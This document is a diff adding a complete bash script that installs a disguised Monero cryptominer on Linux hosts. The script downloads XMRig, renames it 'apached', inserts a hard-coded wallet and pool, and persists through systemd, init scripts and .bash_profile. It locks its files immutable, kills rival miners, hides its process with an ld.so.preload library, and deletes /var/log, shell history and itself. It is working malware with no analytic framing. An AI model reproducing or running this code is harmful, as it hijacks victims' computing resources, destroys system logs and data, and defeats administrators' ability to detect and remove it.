@@ -1,0 +1,131 @@
+#!/bin/bash
+username=`whoami`
+now_pwd=`pwd`
+file_name="$0"
+if [ -d "/etc/apached" ] || [ -d "/home/$username/.apached" ]; then
+	echo "apached directory already exists. Exiting..."
+	rm -rf ~/.bash_history && rm -rf /var/log/*
+	rm -rf $now_pwd/$file_name
+	exit 0
+else
+	if [ "$username" == "root" ]; then
+		echo -e "while true;do\n    rm -rf /tmp/*\n    rm -rf /var/spool/cron/crontabs/*\n    killall -9 kinsing\n    killall -9 kdevtmpfsi\n    rm -rf /tmp/kdevtmpfsi\n    chattr -ia /etc/systemd/system/local-fs.service\n    rm -rf /etc/systemd/system/local-fs.service\n    rm -rf /dev/shm/.config/config\n    rm -rf /etc/systemd/system/xmrig.service\n    rm -rf /etc/.system/php\n    killall -9 *xmrig*\n    rm -rf ~/c3pool\n    sleep 10\ndone" >> /etc/apache.sh && chmod 777 /etc/apache.sh && nohup /etc/apache.sh >> /dev/null 2>&1 &
+		mkdir /etc/apached && wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O /etc/apached/xmrig.tar.gz && cd /etc/apached && tar zxvf xmrig.tar.gz && mv /etc/apached/xmrig-6.21.0/* /etc/apached && rm -rf /etc/apached/xmrig-6.21.0 && rm -rf /etc/apached/xmrig.tar.gz && mv /etc/apached/xmrig /etc/apached/apached && sed -i 's/YOUR_WALLET_ADDRESS/443JCCu4prCcnMA7zKEhdn5zTgt1ajw2o5Jn3jYNKTVo5dFvbNaeXMAjLxs97623qjYVyacrur4jZPG6DWPNZnxNK6Dn1o7/g' /etc/apached/config.json && sed -i 's/"pass": "x"/"pass": "'$(curl -s ifconfig.me | sed 's/:/./g')'"/' /etc/apached/config.json && sed -i 's/"max-threads-hint": 100/"max-threads-hint": 70/g' /etc/apached/config.json && sed -i 's/donate.v2.xmrig.com:3333/auto.c3pool.org:80/g' /etc/apached/config.json && rm -rf /etc/apached/xmrig-6.21.0 && chmod +x /etc/apached/apached
+		chattr +i /etc/apached/apached
+		
+		echo -e 'Description=Apache Daemon\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/etc/apached/apached\nRestart=always\n\n[Install]\n\nWantedBy=multi-user.target' >> /etc/systemd/system/apached.service 
+		systemctl enable apached.service && systemctl start apached.service
+		count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")			
+		if [ $count -gt 0 ]
+		then
+			echo "systemd success"
+			chmod 777 /etc/systemd/system/apached.service
+			touch -m -t 202101082044 /etc/apached/apached
+			touch -m -t 202101082044 /etc/systemd/system/apached.service
+			chattr +i /etc/systemd/system/apached.service
+		else
+			echo "systemd faile"
+			if [ -f /etc/init.d/functions ]; then
+				NETWORK_FUNCTIONS="/etc/init.d/functions"
+				echo -e -n '#!/bin/bash\n\n### BEGIN INIT INFO\n# Provides:          apached\n# Required-Start:    $remote_fs $syslog\n# Required-Stop:     $remote_fs $syslog\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: Start apached at boot time\n# Description:       Enable apached service provided by daemon.\n### END INIT INFO\n\n'$NETWORK_FUNCTIONS'\n\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\nDAEMON=/etc/apached/apached\nNAME=apached\nDESC="apached service"\n\ncase $1 in\n  start)\n    nohup $DAEMON >> /dev/null 2>&1 &\n    ;;\n  stop)\n    killall -9 "$NAME" >> /dev/null 2>&1\n    ;;\n  restart)\n    $0 stop\n    sleep 1\n    $0 start\n    ;;\n  *)\n    exit 1\n    ;;\nesac\n\nexit 0' >> /etc/init.d/apached
+				chmod +x /etc/init.d/apached
+				update-rc.d apached defaults
+				chkconfig --add apached && chkconfig apached on
+				touch -m -t 202101082044 /etc/apached/apached
+				touch -m -t 202101082044 /etc/init.d/apached
+				chattr +i /etc/init.d/apached
+				/etc/init.d/apached start
+				count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+				if [ $count -gt 0 ]
+				then
+					echo "init success"
+				else
+					echo "init faile"
+					echo '/etc/apached/apached' >> ~/.bash_profile
+					nohup /etc/apached/apached > /dev/null 2>&1 &
+					count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+					if [ $count -gt 0 ]
+					then
+						echo "apached success"
+					else
+						echo "apached faile"
+					fi
+				fi
+			else
+				if [ -f /lib/lsb/init-functions ]; then
+					NETWORK_FUNCTIONS="/lib/lsb/init-functions"
+					echo -e -n '#!/bin/bash\n\n### BEGIN INIT INFO\n# Provides:          apached\n# Required-Start:    $remote_fs $syslog\n# Required-Stop:     $remote_fs $syslog\n# Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n# Short-Description: Start apached at boot time\n# Description:       Enable apached service provided by daemon.\n### END INIT INFO\n\n'$NETWORK_FUNCTIONS'\n\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\nDAEMON=/etc/apached/apached\nNAME=apached\nDESC="apached service"\n\ncase $1 in\n  start)\n    nohup $DAEMON >> /dev/null 2>&1 &\n    ;;\n  stop)\n    killall -9 "$NAME" >> /dev/null 2>&1\n    ;;\n  restart)\n    $0 stop\n    sleep 1\n    $0 start\n    ;;\n  *)\n    exit 1\n    ;;\nesac\n\nexit 0' >> /etc/init.d/apached
+					chmod +x /etc/init.d/apached
+					update-rc.d apached defaults
+					chkconfig --add apached && chkconfig apached on
+					touch -m -t 202101082044 /etc/apached/apached
+					touch -m -t 202101082044 /etc/init.d/apached
+					chattr +i /etc/init.d/apached
+					/etc/init.d/apached start
+					count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+					if [ $count -gt 0 ]
+					then
+						echo "init success"
+					else
+						echo "init faile"
+						echo '/etc/apached/apached' >> ~/.bash_profile
+						nohup /etc/apached/apached > /dev/null 2>&1 &
+						count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+						if [ $count -gt 0 ]
+						then
+							echo "apached success"
+						else
+							echo "apached faile"
+						fi
+					fi
+				else
+					echo "init faile"
+					echo '/etc/apached/apached' >> ~/.bash_profile
+					nohup /etc/apached/apached > /dev/null 2>&1 & 
+					count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+					if [ $count -gt 0 ]
+					then
+						echo "apached success"
+					else
+						echo "apached faile"
+					fi
+				fi
+			fi
+		fi
+		if command -v gcc >/dev/null 2>&1 && command -v make >/dev/null 2>&1; then
+			mkdir /usr/local/lib
+			cd /etc/apached && wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/processhider.c && wget https://raw.githubusercontent.com/gianlucaborello/libprocesshider/master/Makefile && sed -i 's/evil_script.py/apached/g' processhider.c && make && cp libprocesshider.so /usr/local/lib/ && echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
+			rm -rf /etc/apached/processhider.c && rm -rf /etc/apached/Makefile && rm -rf /etc/apached/libprocesshider.so
+			echo "libprocesshider success"
+		else
+			echo "not hava gcc or make"
+		fi
+	else
+		echo -e "while true;do\n    rm -rf /tmp/*\n    rm -rf /var/spool/cron/crontabs/*\n    killall -9 kinsing\n    killall -9 kdevtmpfsi\n    rm -rf /tmp/kdevtmpfsi\n    chattr -ia /etc/systemd/system/local-fs.service\n    rm -rf /etc/systemd/system/local-fs.service\n    rm -rf /dev/shm/.config/config\n    rm -rf /etc/systemd/system/xmrig.service\n    rm -rf /etc/.system/php\n    killall -9 *xmrig*\n    rm -rf ~/c3pool\n    sleep 10\ndone" >> apache.sh && chmod 777 apache.sh && nohup apache.sh >> /dev/null 2>&1 &
+		mkdir /home/$username/.apached && wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O /home/$username/.apached/xmrig.tar.gz && cd /home/$username/.apached && tar zxvf xmrig.tar.gz && mv xmrig-6.21.0/* /home/$username/.apached && rm -rf /home/$username/.apached/xmrig.tar.gz && rm -rf /home/$username/.apached/xmrig-6.21.0 && mv /home/$username/.apached/xmrig /home/$username/.apached/apached && sed -i 's/YOUR_WALLET_ADDRESS/443JCCu4prCcnMA7zKEhdn5zTgt1ajw2o5Jn3jYNKTVo5dFvbNaeXMAjLxs97623qjYVyacrur4jZPG6DWPNZnxNK6Dn1o7/g' /home/$username/.apached/config.json && sed -i 's/"pass": "x"/"pass": "'$(curl -s ifconfig.me)'"/' /home/$username/.apached/config.json && sed -i 's/"max-threads-hint": 100/"max-threads-hint": 70/g' /home/$username/.apached/config.json && sed -i 's/donate.v2.xmrig.com:3333/auto.c3pool.org:80/g' /home/$username/.apached/config.json
+		echo '/home/'$username'/.apached/apached' >> ~/.bash_profile
+		chattr +i /home/$username/.apached/*
+		nohup /home/$username/.apached/apached > /dev/null 2>&1 & 
+		count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+		if [ $count -gt 0 ]
+		then
+			echo "apached success"
+		else
+			cd $now_pwd && mkdir .apached && cd .apached && wget https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz -O xmrig.tar.gz && tar zxvf xmrig.tar.gz && mv ./xmrig-6.21.0/* . && rm -rf ./xmrig-6.21.0 && rm -rf xmrig.tar.gz && mv xmrig apached && sed -i 's/YOUR_WALLET_ADDRESS/443JCCu4prCcnMA7zKEhdn5zTgt1ajw2o5Jn3jYNKTVo5dFvbNaeXMAjLxs97623qjYVyacrur4jZPG6DWPNZnxNK6Dn1o7/g' config.json && sed -i 's/"pass": "x"/"pass": "'$(curl -s ifconfig.me)'"/' config.json && sed -i 's/"max-threads-hint": 100/"max-threads-hint": 65/g' config.json && sed -i 's/donate.v2.xmrig.com:3333/auto.c3pool.org:80/g' config.json
+			echo $now_pwd'/.apached/apached' >> ~/.bash_profile
+			chattr +i $now_pwd/.apached/*
+			nohup $now_pwd/.apached/apached > /dev/null 2>&1 & 
+			count=$(ps aux | grep "apached" | grep -v "grep" | grep -c "apached")
+			if [ $count -gt 0 ]
+			then
+				echo "apached success"
+			else
+				echo "apached faile"
+			fi
+		fi
+		chattr +i ~/.bash_profile
+	rm -rf ~/.bash_history && rm -rf /var/log/*
+	rm -rf $now_pwd/$file_name
+	fi
+
+fi
